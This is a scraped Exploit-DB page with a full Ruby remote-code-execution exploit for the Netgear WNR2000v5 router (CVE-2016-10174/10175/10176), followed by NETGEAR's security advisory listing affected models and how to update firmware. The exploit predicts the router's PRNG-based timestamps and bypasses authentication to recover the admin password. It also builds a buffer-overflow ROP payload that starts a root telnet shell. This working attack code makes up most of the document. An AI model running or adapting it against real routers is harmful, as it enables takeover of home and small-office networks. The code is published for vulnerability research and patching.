=== Content from www.exploit-db.com_c0c8c231_20250124_195703.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Netgear WNR2000v5 - Remote Code Execution

#### EDB-ID:

###### 40949

#### CVE:

###### [2016-10176](https://nvd.nist.gov/vuln/detail/CVE-2016-10176) [2016-10175](https://nvd.nist.gov/vuln/detail/CVE-2016-10175) [2016-10174](https://nvd.nist.gov/vuln/detail/CVE-2016-10174)

---

**EDB Verified:**

#### Author:

###### [Pedro Ribeiro](/?author=6459)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [CGI](/?platform=cgi)

#### Date:

###### 2016-12-21

---

**Vulnerable App:**

```
#
# Remote code execution in NETGEAR WNR2000v5
# - by Pedro Ribeiro (pedrib@gmail.com) / Agile Information Security
# Released on 20/12/2016
#
# NOTE: this exploit is "alpha" quality and has been deprecated. Please see the modules
# accepted into the Metasploit framework, or https://github.com/pedrib/PoC/tree/master/exploits/metasploit/wnr2000
#
#
# TODO:
# - randomise payload

require 'net/http'
require 'uri'
require 'time'
require 'digest'
require 'openssl'
require 'socket'

####################
# ported from https://git.uclibc.org/uClibc/tree/libc/stdlib/random.c
# and https://git.uclibc.org/uClibc/tree/libc/stdlib/random_r.c

TYPE_3 = 3
BREAK_3 = 128
DEG_3 = 31
SEP_3 = 3

@randtbl =
[
  # we omit TYPE_3 from here, not needed
  -1726662223, 379960547, 1735697613, 1040273694, 1313901226,
  1627687941, -179304937, -2073333483, 1780058412, -1989503057,
  -615974602, 344556628, 939512070, -1249116260, 1507946756,
  -812545463, 154635395, 1388815473, -1926676823, 525320961,
  -1009028674, 968117788, -123449607, 1284210865, 435012392,
  -2017506339, -911064859, -370259173, 1132637927, 1398500161,
  -205601318,
]

@unsafe_state = {
  "fptr" => SEP_3,
  "rptr" => 0,
  "state" => 0,
  "rand_type" => TYPE_3,
  "rand_deg" => DEG_3,
  "rand_sep" => SEP_3,
  "end_ptr" => DEG_3
}

# Emulate the behaviour of C's srand
def srandom_r (seed)
  state = @randtbl
  if seed == 0
    seed = 1
  end
  state[0] = seed

  dst = 0
  word = seed
  kc = DEG_3
  for i in 1..(kc-1)
    hi = word / 127773
    lo = word % 127773
    word = 16807 * lo - 2836 * hi
    if (word < 0)
      word += 2147483647
    end
    dst += 1
    state[dst] = word
  end

  @unsafe_state['fptr'] = @unsafe_state['rand_sep']
  @unsafe_state['rptr'] = 0

  kc *= 10
  kc -= 1
  while (kc >= 0)
    random_r
    kc -= 1
  end
end

# Emulate the behaviour of C's rand
def random_r
  buf = @unsafe_state
  state = buf['state']

  fptr = buf['fptr']
  rptr = buf['rptr']
  end_ptr = buf['end_ptr']
  val = @randtbl[fptr] += @randtbl[rptr]

  result = (val >> 1) & 0x7fffffff
  fptr += 1
  if (fptr >= end_ptr)
    fptr = state
    rptr += 1
  else
    rptr += 1
    if (rptr >= end_ptr)
      rptr = state
    end
  end
  buf['fptr'] = fptr
  buf['rptr'] = rptr

  result
end
#####################

#####################
# Ruby code ported from https://github.com/insanid/netgear-telenetenable
#
def telnetenable (username, password)
  mac_pad = @mac.gsub(':', '').upcase.ljust(0x10,"\x00")
  username_pad = username.ljust(0x10, "\x00")
  password_pad = password.ljust(0x21, "\x00")
  cleartext = (mac_pad + username_pad + password_pad).ljust(0x70, "\x00")

  md5 = Digest::MD5.new
  md5.update(cleartext)
  payload = (md5.digest + cleartext).ljust(0x80, "\x00").unpack('N*').pack('V*')

  secret_key = "AMBIT_TELNET_ENABLE+" + password
  cipher = OpenSSL::Cipher::Cipher.new("bf-ecb").send :encrypt
  cipher.key_len = secret_key.length
  cipher.key = secret_key
  cipher.padding = 0
  binary_data = (cipher.update(payload) << cipher.final)

  s = UDPSocket.new
  s.send(binary_data.unpack('N*').pack('V*'), 0, @target.split(':')[0], 23)
end
#####################

# Do some crazyness to force Ruby to cast to a single-precision float and
# back to an integer.
# This emulates the behaviour of the soft-fp library and the float cast
# which is done at the end of Netgear's timestamp generator.
def ieee754_round (number)
  [number].pack('f').unpack('f*')[0].to_i
end

# This is the actual algorithm used in the get_timestamp function in
# the Netgear firmware.
def get_timestamp(time)
  srandom_r time
  t0 = random_r
  t1 = 0x17dc65df;
  hi = (t0 * t1) >> 32;
  t2 = t0 >> 31;
  t3 = hi >> 23;
  t3 = t3 - t2;
  t4 = t3 * 0x55d4a80;
  t0 = t0 - t4;
  t0 = t0 + 0x989680;

  ieee754_round(t0)
end

# Default credentials for the router
USERNAME = "admin"
PASSWORD = "password"

def get_request(uri_str)
  uri = URI.parse(uri_str)
  http = Net::HTTP.new(uri.host, uri.port)
  #http.set_debug_output($stdout)
  request = Net::HTTP::Get.new(uri.request_uri)
  request.basic_auth(USERNAME, PASSWORD)
  http.request(request)
end

def post_request(uri_str, body)
  uri = URI.parse(uri_str)
  header = { 'Content-Type' => 'application/x-www-form-urlencoded' }
  http = Net::HTTP.new(uri.host, uri.port)
  #http.set_debug_output($stdout)
  request = Net::HTTP::Post.new(uri.request_uri, header)
  request.basic_auth(USERNAME, PASSWORD)
  request.body = body
  http.request(request)
end

def check
  response = get_request("http://#{@target}/")
  auth = response['WWW-Authenticate']
  if auth != nil
    if auth =~ /WNR2000v5/
      puts "[+] Router is vulnerable and exploitable (WNR2000v5)."
      return
    elsif auth =~ /WNR2000v4/ || auth =~ /WNR2000v3/
      puts "[-] Router is vulnerable, but this exploit might not work (WNR2000v3 or v4)."
      return
    end
  end
  puts "Router is not vulnerable."
end

def get_password
  response = get_request("http://#{@target}/BRS_netgear_success.html")
  if response.body =~ /var sn="([\w]*)";/
    serial = $1
  else
    puts "[-]Failed to obtain serial number, bailing out..."
    exit(1)
  end

  # 1: send serial number
  response = post_request("http://#{@target}/apply_noauth.cgi?/unauth.cgi", "submit_flag=match_sn&serial_num=#{serial}&continue=+Continue+")

  # 2: send answer to secret questions
  response = post_request("http://#{@target}/apply_noauth.cgi?/securityquestions.cgi", \
    "submit_flag=security_question&answer1=secretanswer1&answer2=secretanswer2&continue=+Continue+")

  # 3: PROFIT!!!
  response = get_request("http://#{@target}/passwordrecovered.cgi")

  if response.body =~ /Admin Password: (.*)<\/TD>/
    password = $1
  else
    puts "[-] Failed to obtain admin password, bailing out..."
    exit(1)
  end

  if response.body =~ /Admin Username: (.*)<\/TD>/
    username = $1
  else
    puts "[-] Failed to obtain admin username, bailing out..."
    exit(1)
  end

  puts "[+] Success! Got admin username #{username} and password #{password}"
  return [username, password]
end

def get_current_time
  response = get_request("http://#{@target}/")

  date = response['Date']
  Time.parse(date).strftime('%s').to_i
end

def get_auth_timestamp(mode)
  if mode == "bof"
    uri_str = "http://#{@target}/lang_check.html"
  else
    uri_str = "http://#{@target}/PWD_password.htm"
  end
  response = get_request(uri_str)
  if response.code == 401
    # try again, might fail the first time
    response = get_request(uri_str)
    if response.code == 200
      if response.body =~ /timestamp=([0-9]{8})/
        $1.to_i
      end
    end
  end
end

def got_shell
  puts "[+] Success, shell incoming!"
  exec("telnet #{@target.split(':')[0]}")
end

if ARGV.length < 2
  puts "Usage: ./netgearPwn.rb <IP:PORT> <check|bof|telnet <MAC>> [noreboot]"
  puts "\tcheck: see if the target is vulnerable"
  puts "\tbof: run buffer overflow exploit on the target"
  puts "\ttelnet <mac>: run telnet exploit on the target, needs MAC address"
  puts "\tnoreboot: optional parameter - don't force a reboot on the target"
  exit(1)
end

@target = ARGV[0]
mode = ARGV[1]

if (ARGV.length > 2 && ARGV[2] == "noreboot") || (ARGV.length > 3 && ARGV[3] == "noreboot")
  reboot = false
else
  reboot = true
end

if mode == "telnet"
  if ARGV.length == 3
    @mac = ARGV[2]
  elsif ARGV.length == 4
    @mac = ARGV[3]
  else
    puts "[-] telnet mode needs MAC address argument!"
    exit(-1)
  end
end

# Maximum time differential to try
# Look 5000 seconds back for the timestamp with reboot
# 500000 with no reboot
if reboot
  TIME_OFFSET = 5000
else
  TIME_OFFSET = 500000
end

# Increase this if you're sure the device is vulnerable and you're not getting a shell
TIME_SURPLUS = 200

if mode == "check"
  check
  exit(0)
end

if mode == "bof"
  def uri_encode (str)
    "%" + str.scan(/.{2}|.+/).join("%")
  end

  def calc_address (libc_base, offset)
    addr = (libc_base + offset).to_s(16)
    uri_encode(addr)
  end

  system_offset = 0x547D0
  gadget = 0x2462C
  libc_base = 0x2ab24000

  payload = 'a' * 36 +                                                                 # filler_1
    calc_address(libc_base, system_offset) +                                           # s0
    '1111' +                                                                           # s1
    '2222' +                                                                           # s2
    '3333' +                                                                           # s3
    calc_address(libc_base, gadget) +                                                  # gadget
    'b' * 0x40 +                                                                       # filler_2
    "killall telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l /bin/sh"         # payload
end

# 0: try to see if the default admin username and password are set
timestamp = get_auth_timestamp(mode)

# 1: reboot the router to get it to generate new timestamps
if reboot and timestamp == nil
  response = post_request("http://#{@target}/apply_noauth.cgi?/reboot_waiting.htm", "submit_flag=reboot&yes=Yes")
  if response.code == "200"
    puts "[+] Successfully rebooted the router. Now wait two minutes for the router to restart..."
    sleep 120
    puts "[*] Connect to the WLAN or Ethernet now. You have one minute to comply."
    sleep 60
  else
    puts "[-] Failed to reboot the router. Bailing out."
    exit(-1)
  end

  puts "[*] Proceeding..."
end

# 2: get the current date from the router and parse it, but only if we are not authenticated...
if timestamp == nil
  end_time = get_current_time
  if end_time <= TIME_OFFSET
    start_time = 0
  else
    start_time = end_time - TIME_OFFSET
  end
  end_time += TIME_SURPLUS

  if end_time < (TIME_SURPLUS * 7.5).to_i
    end_time = (TIME_SURPLUS * 7.5).to_i
  end

  puts "[+] Got time #{end_time} from router, starting exploitation attempt."
  puts "[*] Be patient, this might take up a long time (typically a few minutes, but maybe an hour or more)."
end

if mode == "bof"
  uri_str = "http://#{@target}/apply_noauth.cgi?/lang_check.html%20timestamp="
  body = "submit_flag=select_language&hidden_lang_avi=#{payload}"
else
  uri_str = "http://#{@target}/apply_noauth.cgi?/PWD_password.htm%20timestamp="
  body = "submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=secretanswer1&question2=2&answer2=secretanswer2"
end

# 3: work back from the current router time minus TIME_OFFSET
while true
  for time in end_time.downto(start_time)
    begin
      if timestamp == nil
        response = post_request(uri_str + get_timestamp(time).to_s, body)
      else
        response = post_request(uri_str + timestamp.to_s, body)
      end
      if response.code == "200"
        # this only occurs in the telnet case
        credentials = get_password
        telnetenable(credentials[0], credentials[1])
        sleep 5
        got_shell
        #puts "Done! Got admin username #{credentials[0]} and password #{credentials[1]}"
        #puts "Use the telnetenable.py script (https://github.com/insanid/netgear-telenetenable) to enable telnet, and connect to port 23 to get a root shell!"
        exit(0)
      end
    rescue EOFError
      if reboot
        sleep 0.2
      else
        # with no reboot we give the router more time to breathe
        sleep 0.5
      end
      begin
        s = TCPSocket.new(@target.split(':')[0], 23)
        s.close
        got_shell
      rescue Errno::ECONNREFUSED
        if timestamp != nil
          # this is the case where we can get an authenticated timestamp but we could not execute code
          # IT SHOULD NEVER HAPPEN
          # But scream and continue just in case, it means there is a bug
          puts "[-] Something went wrong. We can obtain the timestamp with the default credentials, but we could not execute code."
          puts "[*] Let's try again..."
          timestamp = get_auth_timestamp
        end
        next
      end
    rescue Net::ReadTimeout
      # for bof case, we land here
      got_shell
    end
  end
  if timestamp == nil
    start_time = end_time - (TIME_SURPLUS * 5)
    end_time = end_time + (TIME_SURPLUS * 5)
    puts "[*] Going for another round, increasing end time to #{end_time} and start time to #{start_time}"
  end
end

# If we get here then the exploit failed
puts "[-] Exploit finished. Failed to get a shell!"

```

**Tags:**
[Remote](/?tag=21)

**Advisory/Source:**
[Link](https://github.com/pedrib/PoC/blob/f2eff0fdb735bec0f0302cf2e10d6325284417bc/exploits/netgearPwn.rb)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from raw.githubusercontent.com_2feacca3_20250124_195702.html ===



=== Content from kb.netgear.com_454865a0_20250124_195701.html ===


Thank You

Thank you for taking the time to respond. The NETGEAR documentation team uses your feedback to improve our knowledge base content.

Close

x

Rating Submitted

Do you have a suggestion for improving this article?

**Characters Left** : 500

Submit
Cancel

x

[![NETGEAR logo](/resource/1658125676000/kbchat/images/netgear-logo.png)](https://www.netgear.com)
[Support](http://www.netgear.com/support/)
|
[Community](https://community.netgear.com/t5/All-Communities/ct-p/English)
|
[CONTACT US](https://www.netgear.com/support/contact.aspx)
|
[DOWNLOADS](http://www.netgear.com/support/download/)

* United States (English)
  ![Country name](/resource/1658125676000/kbchat/images/us_flag.png)
  + [Deutschland (Deutsch)](https://www.netgear.de/support)
  + [España (Español)](https://www.netgear.es/support)
  + [France (Français)](https://www.netgear.fr/support)
  + [Italia (Italiano)](https://www.netgear.it/support)
  + [日本 (日本語)](https://www.netgear.jp/support)
  + [Netherlands (Dutch)](https://www.netgear.nl/support)
  + [United States (English)](https://www.netgear.com/support/)

* + ![](/resource/1658125676000/kbchat/images/avatar.png)

    SIGN IN

    MyNETGEAR® Account

    Welcome back

    Access your NETGEAR

    Sign up and enjoy these benefits!

    - [![](/resource/1658125676000/kbchat/images/myorders.png)
      My Orders](https://accounts.netgear.com/login?redirectUrl=https%3A%2F%2Fstore.netgear.com%2Fon%2Fdemandware.store%2FSites-netgear-us-Site%2Fen_US%2FSingleSignOn-Reentry?returnUrl=https://store.netgear.com/orderhistory)
    - [![](/resource/1658125676000/kbchat/images/manageprofile.png)
      Manage Profile](https://accounts.netgear.com/account?redirectUrl=https%3A%2F%2Fwww.netgear.com%2Fdefault.aspx)
    - [![](/resource/1658125676000/kbchat/images/mysupport.png)
      My Support](https://my.netgear.com/cases.aspx)
    - [![](/resource/1658125676000/kbchat/images/trackorder.png)
      Track RMA](https://accounts.netgear.com/login?redirectUrl=https://www.netgear.com/mynetgear/registration/login.aspx?ReturnUrl=/mynetgear/rmacheck.aspx)
    - [![](/resource/1658125676000/kbchat/images/trackorder.png)
      Track Order](https://store.netgear.com/trackorder)CREATE ACCOUNT

    SIGN IN
    [LOG OUT](https://store.netgear.com/loginlogout?returnUrl=https://www.netgear.com/support/default.aspx)
* |

* [Log In](https://my.netgear.com/myNETGEAR/myProducts.asp)
* [Community](https://community.netgear.com/t5/All-Communities/ct-p/English)

* [Support](http://www.netgear.com/support/)

* ![Country name](/resource/1658125676000/kbchat/images/us_flag.png)
  United States (English)
  + [Deutschland (Deutsch)](https://www.netgear.de/support)
  + [España (Español)](https://www.netgear.es/support)
  + [France (Français)](https://www.netgear.fr/support)
  + [Italia (Italiano)](https://www.netgear.it/support)
  + [日本 (日本語)](https://www.netgear.jp/support)
  + [Netherlands (Dutch)](https://www.netgear.nl/support)
  + [United States (English)](https://www.netgear.com/support/)

* [MyNETGEAR Account](https://my.netgear.com)

![](/resource/1658125676000/kbchat/images/avatar.png)

SIGN IN

[![NETGEAR logo](/resource/1658125676000/kbchat/images/netgear-logo.png)](https://www.netgear.com)

[Support](http://www.netgear.com/support/)

MyNETGEAR® Account

Welcome back

Access your NETGEAR

* [![](/resource/1658125676000/kbchat/images/myorders.png)
  My Orders](https://accounts.netgear.com/login?redirectUrl=https%3A%2F%2Fstore.netgear.com%2Fon%2Fdemandware.store%2FSites-netgear-us-Site%2Fen_US%2FSingleSignOn-Reentry?returnUrl=https://store.netgear.com/orderhistory)
* [![](/resource/1658125676000/kbchat/images/manageprofile.png)
  Manage Profile](https://accounts.netgear.com/account?redirectUrl=https%3A%2F%2Fwww.netgear.com%2Fdefault.aspx)
* [![](/resource/1658125676000/kbchat/images/mysupport.png)
  My Support](https://accounts.netgear.com/login?redirectUrl=https://www.netgear.com/mynetgear/registration/login.aspx?ReturnUrl=/mynetgear/portal/mysupport.aspx)
* [![](/resource/1658125676000/kbchat/images/trackorder.png)
  Track RMA](https://accounts.netgear.com/login?redirectUrl=https://www.netgear.com/mynetgear/registration/login.aspx?ReturnUrl=/mynetgear/rmacheck.aspx)
* [![](/resource/1658125676000/kbchat/images/trackorder.png)
  Track Order](https://store.netgear.com/trackorder)

CREATE ACCOUNT

SIGN IN
[LOG OUT](https://store.netgear.com/loginlogout?returnUrl=https://www.netgear.com/support/default.aspx)

[NETGEAR Support](http://www.netgear.com/support/)

# Insecure Remote Access and Command Execution Security Vulnerability, PSV-2016-0255

Was this article helpful?

 Yes

 No

This security advisory addresses the following CVE vulnerabilities: CVE-2016-10174, CVE-2016-10175, and CVE-2016-10176.

NETGEAR is aware of the security vulnerability that can in very limited instances allow remote access to a router or modem router, including password recovery and command execution. This vulnerability occurs when an attacker has access to the internal network or when a user has turned on remote management on the router or modem router.

Remote management is turned off by default, so a user must have affirmatively turned on remote management through advanced settings for the router or modem router to be vulnerable in this manner.

This vulnerability affects the following products:

* D6100
* D7000
* D7800
* JNR1010v2
* JNR3300
* JWNR2010v5
* R2000
* R6100
* R6220
* R7500
* R7500v2
* WNDR3700v4
* WNDR3800
* WNDR4300
* WNDR4300v2
* WNDR4500v3
* WNDR4700
* WNR1000v2
* WNR1000v4
* WNR2000v3
* WNR2000v4
* WNR2000v5
* WNR2020
* WNR2050
* WNR2200
* WNR2500
* WNR614
* WNR618

NETGEAR has released production firmware updates that fix the remote access and command execution vulnerability for all affected products. NETGEAR strongly recommends that all users update to the latest firmware as soon as it is available, even if you already downloaded a beta firmware fix.

**To download the latest firmware for your NETGEAR product:**

1. Visit the [NETGEAR Download Center](http://downloadcenter.netgear.com/).
2. Under **Search for**, select the check box next to **Firmware/Software**.
3. Start typing your model number in the search box, then select your model from the drop-down menu as soon as it appears.

   If you do not see a drop-down menu, make sure that you entered your model number correctly, or use the product drilldown to find your model.
4. Click **Release Notes** under the most recent firmware version, which is the one closest to the top of the list.

   **Note:** Make sure that you are viewing release notes for a firmware version and not a software utility or an app. The title of the release notes page always begins with the words “Firmware Version.”
5. Follow the instructions in the release notes to download and install the new firmware.

The potential for remote access and command execution remains if you do not turn off remote management or update your firmware. NETGEAR is not responsible for any consequences that could have been avoided by following the recommendations in this notification.

## Contact

We appreciate and value having security concerns brought to our attention. NETGEAR constantly monitors for both known and unknown threats. Being pro-active rather than re-active to emerging security issues is fundamental for product support at NETGEAR.

It is NETGEAR's mission to be the innovative leader in connecting the world to the internet. To achieve this mission, we strive to earn and maintain the trust of those that use NETGEAR products for their connectivity.

To report a security vulnerability, visit <http://www.netgear.com/about/security/>.

If you are a NETGEAR customer with a security-related support concern, you can contact NETGEAR customer support at techsupport.security@netgear.com.

##

## Revision History

2016-12-22: Published advisory

2016-12-23:

* Added beta firmware for WNR2000v3, WNR2000v4, and WNR2000v5
* Added PSV number to title
* Clarified vulnerability description

2017-1-16: Updated contact information

2017-1-26:

* Added production firmware links for WNR2000v3, WNR2000v4, and WNR2000v5
* Removed beta firmware links for WNR2000v3, WNR2000v4, and WNR2000v5

2017-2-3: Added CVE numbers

2017-6-9:

* Added 26 affected models
* Added 2 fixed models: D7000, R7500v2
* Added download instructions instead of links.
* Simplified and clarified wording
* Updated contact information

2017-12-5:

* Removed a model that is not affected: D6200
* Added a statement that all models are fixed
* Removed instructions for users whose models are not fixed yet

Last Updated:12/05/2017
|
Article ID: 000036549

### Was this article helpful?

YesNo

#### This article applies to:

* DSL Gateway AC (3)
  + [D6100](https://www.netgear.com/support/product/D6100)
  + [D7000](https://www.netgear.com/support/product/D7000)
  + [D7800](https://www.netgear.com/support/product/D7800)
* Wireless N Router (21)
  + [CENTRIA (WNDR4700/4720)](https://www.netgear.com/search.html?page=1&query=CENTRIA (WNDR4700/4720)&col=46&sort1=relevance&sortdir1=desc&tabName=support)
  + [JNR1010v2](https://www.netgear.com/support/product/JNR1010v2)
  + [JNR3300](https://www.netgear.com/support/product/JNR3300)
  + [JWNR2010v5](https://www.netgear.com/support/product/JWNR2010v5)
  + [R2000](https://www.netgear.com/support/product/R2000)
  + [WNDR3700v4](https://www.netgear.com/support/product/WNDR3700v4)
  + [WNDR3800](https://www.netgear.com/support/product/WNDR3800)
  + [WNDR4300](https://www.netgear.com/support/product/WNDR4300)
  + [WNDR4300v2](https://www.netgear.com/support/product/WNDR4300v2)
  + [WNDR4500v3](https://www.netgear.com/support/product/WNDR4500v3)
  + [WNR1000v2](https://www.netgear.com/support/product/WNR1000v2)
  + [WNR1000v4](https://www.netgear.com/support/product/WNR1000v4)
  + [WNR2000v3](https://www.netgear.com/support/product/WNR2000v3)
  + [WNR2000v4](https://www.netgear.com/support/product/WNR2000v4)
  + [WNR2000v5](https://www.netgear.com/support/product/WNR2000v5)
  + [WNR2020](https://www.netgear.com/support/product/WNR2020)
  + [WNR2050](https://www.netgear.com/support/product/WNR2050)
  + [WNR2200](https://www.netgear.com/support/product/WNR2200)
  + [WNR2500](https://www.netgear.com/support/product/WNR2500)
  + [WNR614](https://www.netgear.com/support/product/WNR614)
  + [WNR618](https://www.netgear.com/support/product/WNR618)
* Wireless AC Router (2)
  + [R6100](https://www.netgear.com/support/product/R6100)
  + [R6220](https://www.netgear.com/support/product/R6220)
* Wireless AC Router Nighthawk (2)
  + [R7500](https://www.netgear.com/support/product/R7500)
  + [R7500v2](https://www.netgear.com/support/product/R7500v2)

How to Find Your Model Number

#### Read this article in another language:

 中国 (汉语)
대한민국 (한국어)
France (Français)
Czech (Čeština)
Danish (Dansk)
Deutschland (Deutsch)
United States (English)
España (Español)
Finnish (suomi)
Hungarian (Magyar)
Italia (Italiano)
Netherlands (Dutch)
